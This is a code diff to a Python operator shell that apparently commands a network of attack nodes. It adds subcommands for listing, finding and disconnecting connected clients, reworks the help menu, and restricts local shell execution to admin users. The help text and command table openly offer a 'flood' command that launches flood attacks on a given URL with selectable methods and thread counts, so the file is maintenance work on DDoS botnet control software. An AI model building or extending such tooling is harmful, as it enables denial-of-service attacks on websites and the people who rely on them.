@@ -4,6 +4,7 @@ from pathlib import Path
 import atexit
 import readline
 import getpass
+import shlex
 import subprocess
 import re
 from colorama import Fore, Style, init
@@ -54,6 +55,10 @@ class Payloads:
     def get_clients():
         return json.dumps({"action": "get_clients"})
 
+    @staticmethod
+    def disconnect_client(client_id):
+        return json.dumps({"action": "disconnect_client", "data": {"client_id": client_id}})
+
 class Functions:
     def __init__(self, controller, shell):
         self.controller = controller
@@ -85,7 +90,24 @@ class Functions:
         resp, result = self.controller.send_to_all(Payloads.get_clients())
         print(f"{Fore.GREEN if result is True else Fore.RED}"
               f"{'Success: Get clients sent to all nodes' if result is True else f'Error: Failed to send get clients: {result}'}{Style.RESET_ALL}")
-        return resp 
+        return resp
+
+    def send_disconnect_client(self, node_id, client_id):
+        resp = self.controller.send_to(node_id, Payloads.disconnect_client(client_id))
+        if not resp:
+            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
+            return None
+
+        try:
+            data = json.loads(resp)
+            if data.get("status") == "success":
+                print(f"{Fore.GREEN}Success: Client {client_id} disconnected on node {node_id}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}Error: Node {node_id} failed to disconnect client {client_id}: {data.get('message', 'unknown')}{Style.RESET_ALL}")
+            return data
+        except (json.JSONDecodeError, TypeError):
+            print(f"{Fore.RED}Error: Invalid response from node {node_id}: {resp}{Style.RESET_ALL}")
+            return None 
 
 class Commands:
     VALID_METHODS = {
@@ -164,10 +186,63 @@ class Commands:
 
         print(f"\n{Fore.YELLOW}Total clients across all nodes: {Fore.GREEN}{total_clients}{Style.RESET_ALL}")
 
+    def _aggregate_clients(self, response_data):
+        aggregated = {}
+        if not isinstance(response_data, dict):
+            return aggregated
+
+        for node_id, node_resp in response_data.items():
+            if not isinstance(node_resp, dict):
+                continue
+
+            if node_resp.get("status") != "success":
+                continue
+
+            clients = node_resp.get("data", {})
+            if not isinstance(clients, dict):
+                continue
+
+            aggregated[node_id] = clients
+
+        return aggregated
+
+    def _count_clients(self, response_data):
+        aggregated = self._aggregate_clients(response_data)
+        return sum(len(clients) for clients in aggregated.values())
+
+    def _find_clients(self, term, response_data):
+        aggregated = self._aggregate_clients(response_data)
+        term_lower = str(term).lower()
+        found = []
+
+        for node_id, clients in aggregated.items():
+            for client_id, info in clients.items():
+                ip_port = info.get("addr") if isinstance(info, dict) else None
+                ip = str(ip_port[0] if ip_port and len(ip_port) > 0 else "")
+                if term_lower in client_id.lower() or term_lower in ip.lower():
+                    found.append((node_id, client_id, ip_port))
+
+        return found
+
+    def _print_client_details(self, node_id, client_id, client_info):
+        print(f"\nClient details for {client_id} on node {node_id}:{Style.RESET_ALL}")
+        print(f"  IP: {Fore.CYAN}{client_info.get('addr', ['N/A', 'N/A'])[0]}{Style.RESET_ALL}")
+        print(f"  Port: {Fore.CYAN}{client_info.get('addr', ['N/A', 'N/A'])[1]}{Style.RESET_ALL}")
+
 
     def help(self, shell, args):
         if args:
             cmd_name = args[0]
+            if cmd_name == "clients":
+                print(f"\nCommand: clients\n  Usage: clients <list|count|find|show|disconnect> [params]\n  Description: Manage connected clients across all nodes\n  Level: 2{Style.RESET_ALL}")
+                print("  Subcommands:\n    list                 - List all clients by node\n    count                - Total number of clients across nodes\n    find <id|ip>        - Search clients by ID or IP\n    show <client_id>    - Show details for exactly one client\n    disconnect <node_id> <client_id> - Disconnect a specific client from a node")
+                return
+
+            if cmd_name == "nodes":
+                print(f"\nCommand: nodes\n  Usage: nodes <list|status|sync|clients|disconnect> [params]\n  Description: Manage node connections and client queries\n  Level: 2{Style.RESET_ALL}")
+                print("  Subcommands:\n    list                  - Show connected nodes\n    status                - Check node connectivity\n    sync                  - Synchronize node list\n    clients <...>         - Proxy to clients subcommands\n    disconnect <node_id>  - Disconnect a node")
+                return
+
             if cmd_name in shell.commands and shell.user_level >= shell.commands[cmd_name].level:
                 cmd = shell.commands[cmd_name]
                 print(f"\nCommand: {cmd.name}\n  Usage: {cmd.usage}\n  Description: {cmd.description}\n  Level: {cmd.level}{Style.RESET_ALL}")
@@ -176,27 +251,38 @@ class Commands:
             return
 
         print(f"\nAvailable Commands:{Style.RESET_ALL}")
-        categories = {"General": [], "Node Management": [], "Attack": []}
-        for cmd in sorted(shell.commands.values(), key=lambda x: x.name):
-            if shell.user_level < cmd.level:
-                continue
-            category = "Attack" if cmd.name == "flood" else "Node Management" if cmd.name in ["nodes", "ping"] else "General"
-            categories[category].append(cmd)
+        print("\nTo get detailed help for a command, use: help <command>\n")
 
-        for category, cmds in categories.items():
-            if cmds:
-                print(f"\n{category}:")
-                for cmd in cmds:
-                    print(f"  {Fore.YELLOW}{cmd.name:<10}{Style.RESET_ALL} - {cmd.description} (level {cmd.level})")
+        command_rows = [
+            ("help", "help [command]", "Show this help message or details for one command", 1),
+            ("quit/exit", "quit | exit", "Exit the interactive shell", 1),
+            ("ping", "ping", "Ping all connected nodes", 2),
+            ("nodes", "nodes <list|status|sync|clients|disconnect> [node_id]", "Node management operations", 2),
+            ("clients", "clients <list|count|find|show|disconnect> [params]", "Client management across nodes", 2),
+            ("methods", "methods", "List available flood attack methods", 1),
+            ("flood", "flood <url> [duration] [method] [threads]", "Start flood attack on a URL", 3),
+            ("!", "! <command>", "Execute a local shell command (admin only)", 3),
+        ]
+
+        for name, usage, description, level in command_rows:
+            if shell.user_level >= level:
+                print(f"  {Fore.YELLOW}{name:<16}{Style.RESET_ALL} {usage:<40} - {description} (level {level})")
+
+        print(f"\nUser level: {shell.user_level} (higher level enables more commands){Style.RESET_ALL}")
 
     def shell_exec(self, shell, args):
         if not args:
             print(f"{Fore.RED}Usage: ! <command>{Style.RESET_ALL}")
             return
+
         command = " ".join(args)
         try:
-            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=30)
-            print(result.stdout)
+            proc = subprocess.run(shlex.split(command), shell=False, check=True, capture_output=True, text=True, timeout=30)
+            print(proc.stdout)
+        except subprocess.CalledProcessError as e:
+            print(f"{Fore.RED}Shell command failed with code {e.returncode}: {e.stderr}{Style.RESET_ALL}")
+        except ValueError as e:
+            print(f"{Fore.RED}Invalid command syntax: {e}{Style.RESET_ALL}")
         except subprocess.SubprocessError as e:
             print(f"{Fore.RED}Error executing command: {e}{Style.RESET_ALL}")
 
@@ -256,8 +342,72 @@ class Commands:
             self.functions.send_sync()
 
         elif subcmd == "clients":
-            resp = self.functions.send_get_clients()
-            self._print_clients_table(resp)
+            if len(args) == 1 or args[1].lower() == "list":
+                resp = self.functions.send_get_clients()
+                if not isinstance(resp, dict):
+                    print(f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}")
+                    return
+                self._print_clients_table(resp)
+                return
+
+            subcmd_client = args[1].lower()
+
+            if subcmd_client == "count":
+                resp = self.functions.send_get_clients()
+                if not isinstance(resp, dict):
+                    print(f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}")
+                    return
+                total = self._count_clients(resp)
+                print(f"{Fore.GREEN}Total connected clients across all nodes: {total}{Style.RESET_ALL}")
+                return
+
+            if subcmd_client == "find":
+                if len(args) != 3:
+                    print(f"{Fore.RED}Usage: clients find <client_id_or_ip>{Style.RESET_ALL}")
+                    return
+                term = args[2]
+                resp = self.functions.send_get_clients()
+                if not isinstance(resp, dict):
+                    print(f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}")
+                    return
+                found = self._find_clients(term, resp)
+                if not found:
+                    print(f"{Fore.YELLOW}No matching clients found for '{term}'{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.GREEN}Found {len(found)} matching clients:{Style.RESET_ALL}")
+                    for node_id, client_id, addr in found:
+                        addr_str = f"{addr[0]}:{addr[1]}" if addr else "N/A"
+                        print(f"  - Node {node_id}: {client_id} (addr={addr_str})")
+                return
+
+            if subcmd_client == "show":
+                if len(args) != 3:
+                    print(f"{Fore.RED}Usage: clients show <client_id>{Style.RESET_ALL}")
+                    return
+                client_id = args[2]
+                resp = self.functions.send_get_clients()
+                if not isinstance(resp, dict):
+                    print(f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}")
+                    return
+                aggregated = self._aggregate_clients(resp)
+                for node_id, clients in aggregated.items():
+                    if client_id in clients:
+                        self._print_client_details(node_id, client_id, clients[client_id])
+                        return
+                print(f"{Fore.YELLOW}Client {client_id} not found on any node{Style.RESET_ALL}")
+                return
+
+            if subcmd_client == "disconnect":
+                if len(args) != 4:
+                    print(f"{Fore.RED}Usage: clients disconnect <node_id> <client_id>{Style.RESET_ALL}")
+                    return
+                node_id = args[2]
+                client_id = args[3]
+                self.functions.send_disconnect_client(node_id, client_id)
+                return
+
+            print(f"{Fore.RED}Error: Unknown clients subcommand '{args[1]}'. Use clients list|count|find|show|disconnect{Style.RESET_ALL}")
+            return
 
         elif subcmd == "disconnect":
             node_id = self._parse_arg(args, 1, default=None, cast=str)
@@ -299,9 +449,10 @@ class Shell:
                 ("exit", self._quit, 1, "exit", "Exit the shell"),
                 ("flood", self._flood, 3, "flood <url> [duration] [method] [threads]", "Initiate a flood attack on a URL"),
                 ("nodes", self._nodes, 2, "nodes <list/status/sync/disconnect> [node_id]", "Manage nodes (list, check status, sync, or disconnect)"),
+                ("clients", self._clients, 2, "clients <list/disconnect> [node_id] [client_id]", "Manage clients (list all, disconnect client)"),
                 ("methods", self._methods, 1, "methods", "List available flood methods"),
                 ("ping", self._ping, 2, "ping", "Ping all nodes"),
-                ("!", self._shell_exec, 1, "! <command>", "Execute a shell command"),
+                ("!", self._shell_exec, 3, "! <command>", "Execute a shell command (admin only)"),
             ]
         }
         self.commands_impl = Commands(controller, self)
@@ -314,6 +465,7 @@ class Shell:
     def _nodes(self, shell, args): self.commands_impl.nodes(shell, args)
     def _methods(self, shell, args): self.commands_impl.methods(shell, args)
     def _ping(self, shell, args): self.commands_impl.ping(shell, args)
+    def _clients(self, shell, args): self.commands_impl.nodes(shell, ["clients"] + args)
     def _shell_exec(self, shell, args): self.commands_impl.shell_exec(shell, args)
 
     def _setup_readline(self):
@@ -343,12 +495,20 @@ class Shell:
 
     def _complete(self, text, state):
         if text.startswith("nodes "):
-            subcommands = ["list", "status", "sync", "disconnect"]
+            subcommands = ["list", "status", "sync", "clients", "disconnect"]
             subtext = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
             options = [f"nodes {subcmd}" for subcmd in subcommands if subcmd.startswith(subtext)]
             if subtext.startswith("disconnect"):
                 nodes = self.controller.get_nodes()
                 options.extend(f"nodes disconnect {node_id}" for node_id, _, _ in nodes if node_id.startswith(text.split(" ")[2] if len(text.split(" ")) > 2 else ""))
+        elif text.startswith("clients "):
+            subcommands = ["list", "count", "find", "show", "disconnect"]
+            parts = text.split(" ")
+            subtext = parts[1] if len(parts) > 1 else ""
+            options = [f"clients {subcmd}" for subcmd in subcommands if subcmd.startswith(subtext)]
+            if subtext.startswith("disconnect") and len(parts) == 3:
+                nodes = self.controller.get_nodes()
+                options.extend(f"clients disconnect {node_id}" for node_id, _, _ in nodes if node_id.startswith(parts[2]))
         elif text.startswith("flood "):
             parts = text.split(" ")
             if len(parts) == 2:
